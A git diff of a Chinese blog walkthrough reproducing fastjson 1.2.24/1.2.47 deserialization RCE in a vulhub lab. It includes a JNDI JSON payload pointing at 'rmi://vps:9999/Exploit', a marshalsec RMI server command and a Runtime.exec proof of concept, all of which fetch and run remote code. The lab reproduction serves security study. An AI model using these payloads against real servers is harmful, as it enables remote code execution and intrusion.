@@ -131,7 +131,8 @@
 <li>tomcat运行环境</li>
 </ul>
 </blockquote>
-<p> tomcat官网下载，7、8、9都可以<br> 启动命令：<br> windows<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#&gt; 存放路径\tomcat9\bin\catalina.bat run</span><br></pre></td></tr></table></figure></p>
+<p>tomcat官网下载，7、8、9都可以<br>启动命令： windows </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#&gt; 存放路径\tomcat9\bin\catalina.bat run</span><br></pre></td></tr></table></figure>
 <p>Linux<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#&gt; 存放路径\tomcat9\bin\catalina.sh run</span><br></pre></td></tr></table></figure></p>
 <blockquote>
 <ul>
@@ -150,10 +151,7 @@
 <li>payload</li>
 </ul>
 </blockquote>
-<ol>
-<li>fastjson_vulhub_poc<a href="https://github.com/vulhub/vulhub/tree/master/fastjson" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/fastjson</a></li>
-<li>fastjson_1.2.24_payload获取：<br>修改<code>\fastjson\vuln\src\main\java\Poc.java</code>中<code>Runtime.getRuntime().exec(&quot;cmd&quot;);</code>cmd为你想要执行的命令.<br>修改后编译Poc.java：<code>javac Poc.java</code>，会生成一个名为<code>Poc.class</code>的文件。<br>然后把<code>fastjson\vuln\exploit.php</code>文件和<code>Poc.class</code>放在同一目录下，修改<code>exploit.php</code>中<code>$bytes = file_get_contents(&#39;zip://&#39; . __DIR__ . &#39;/fastjson-1.0.war#WEB-INF/classes/Poc.class&#39;);</code>为<code>$bytes = file_get_contents(&#39;./Poc.class&#39;);</code>。命令行运行<code>php exploit.php</code>，输出的内容就是payload。</li>
-</ol>
+<p>fastjson_vulhub_poc<a href="https://github.com/vulhub/vulhub/tree/master/fastjson" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/fastjson</a><br>fastjson_1.2.24_payload获取：<br>修改<code>\fastjson\vuln\src\main\java\Poc.java</code>中<code>Runtime.getRuntime().exec(&quot;cmd&quot;);</code>cmd为你想要执行的命令.<br>修改后编译Poc.java：<code>javac Poc.java</code>，会生成一个名为<code>Poc.class</code>的文件。<br>然后把<code>fastjson\vuln\exploit.php</code>文件和<code>Poc.class</code>放在同一目录下，修改<code>exploit.php</code>中<code>$bytes = file_get_contents(&#39;zip://&#39; . __DIR__ . &#39;/fastjson-1.0.war#WEB-INF/classes/Poc.class&#39;);</code>为<code>$bytes = file_get_contents(&#39;./Poc.class&#39;);</code>。命令行运行<code>php exploit.php</code>，输出的内容就是payload。</p>
 <blockquote>
 <ul>
 <li>burp suite</li>
@@ -165,11 +163,7 @@
 <li>maven编译打包环境</li>
 </ul>
 </blockquote>
-<ol>
-<li>一般java的IDEA都会带</li>
-<li>kali也自带</li>
-<li>官网下载<a href="https://maven.apache.org/download.cgi" target="_blank" rel="noopener">https://maven.apache.org/download.cgi</a>，<br>直接解压就能用，记得添加环境变量。</li>
-</ol>
+<p>一般java的IDEA都会带<br>kali也自带<br>官网下载<a href="https://maven.apache.org/download.cgi" target="_blank" rel="noopener">https://maven.apache.org/download.cgi</a>，<br>直接解压就能用，记得添加环境变量。</p>
 <blockquote>
 <ul>
 <li>marshalsec-0.0.3-SNAPSHOT-all.jar</li>
@@ -191,17 +185,13 @@
 <p>编译 Exploit.java，命令如下，生成<code>Exploit.class</code>。<br><code>javac Exploit.java</code></p>
 <blockquote>
 <ul>
-<li>Payload<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"a"</span>:&#123;</span><br><span class="line">        <span class="attr">"@type"</span>:<span class="string">"java.lang.Class"</span>,</span><br><span class="line">        <span class="attr">"val"</span>:<span class="string">"com.sun.rowset.JdbcRowSetImpl"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"b"</span>:&#123;</span><br><span class="line">        <span class="attr">"@type"</span>:<span class="string">"com.sun.rowset.JdbcRowSetImpl"</span>,</span><br><span class="line">        <span class="attr">"dataSourceName"</span>:<span class="string">"rmi://vps:9999/Exploit"</span>,</span><br><span class="line">        <span class="attr">"autoCommit"</span>:<span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-</li>
+<li>Payload</li>
 </ul>
 </blockquote>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"a"</span>:&#123;</span><br><span class="line">        <span class="attr">"@type"</span>:<span class="string">"java.lang.Class"</span>,</span><br><span class="line">        <span class="attr">"val"</span>:<span class="string">"com.sun.rowset.JdbcRowSetImpl"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"b"</span>:&#123;</span><br><span class="line">        <span class="attr">"@type"</span>:<span class="string">"com.sun.rowset.JdbcRowSetImpl"</span>,</span><br><span class="line">        <span class="attr">"dataSourceName"</span>:<span class="string">"rmi://vps:9999/Exploit"</span>,</span><br><span class="line">        <span class="attr">"autoCommit"</span>:<span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><h3 id="fastjson-1-2-24-RCE"><a href="#fastjson-1-2-24-RCE" class="headerlink" title="fastjson_1.2.24_RCE"></a>fastjson_1.2.24_RCE</h3><p>打开burp，设置好代理。<br>打开浏览器，设置好代理。<br>访问<code>http://ip:port/fastjson-1.0/</code>，把burp抓到的包发送到重放模块，<br>修改http协议为POST,请求体为<br><code>{&quot;name&quot;:&quot;john&quot;,age:12}</code><br>点击<code>Go</code>，得到如下响应<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 </span><br><span class="line">Content-Type: application/json</span><br><span class="line">Date: Sat, 10 Aug 2019 15:05:08 GMT</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 51</span><br><span class="line"></span><br><span class="line">&#123;&quot;data&quot;:&quot;Hello john, Your age is 12&quot;,&quot;success&quot;:200&#125;</span><br></pre></td></tr></table></figure></p>
 <p>说明fastjson起作用了。<br>下面开始利用，修改请求体为上面获取的payload，点击发送<br><img src="https://image-langke.bj.bcebos.com/hexo-neirongpeitu/漏洞复现/fastjson_1.2.24_calc.png" alt="https://image-langke.bj.bcebos.com/hexo-neirongpeitu/漏洞复现/fastjson_1.2.24_calc.png"></p>
-<h3 id="fastjson-1-2-27-RCE"><a href="#fastjson-1-2-27-RCE" class="headerlink" title="fastjson_1.2.27_RCE"></a>fastjson_1.2.27_RCE</h3><ol>
-<li>抓包<br>同上，还是利用上面的方式抓包，不过抓的是换了1.2.47版本并重启后的数据包。</li>
-<li>启动rmi服务器<br><code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://vps/#Exploit&quot; 9999</code></li>
-<li>发送payload</li>
-</ol>
+<h3 id="fastjson-1-2-27-RCE"><a href="#fastjson-1-2-27-RCE" class="headerlink" title="fastjson_1.2.27_RCE"></a>fastjson_1.2.27_RCE</h3><p>抓包<br>同上，还是利用上面的方式抓包，不过抓的是换了1.2.47版本并重启后的数据包。<br>启动rmi服务器<br><code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://vps/#Exploit&quot; 9999</code><br>发送payload</p>
 <p>把payload复制到burp重放模块的POST请求的请求体位置，点击<code>Go</code></p>
 
         </section>
@@ -237,6 +227,8 @@
         -->
         <!--
         <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2019/08/14/CVE-2019-21763-redis远程命令执行漏洞复现/">CVE-2019-21763-redis远程命令执行漏洞复现</a>
             
             
             <a class="next" rel="next" href="/2019/07/07/内网渗透常用工具和方法/">内网渗透常用工具和方法</a>
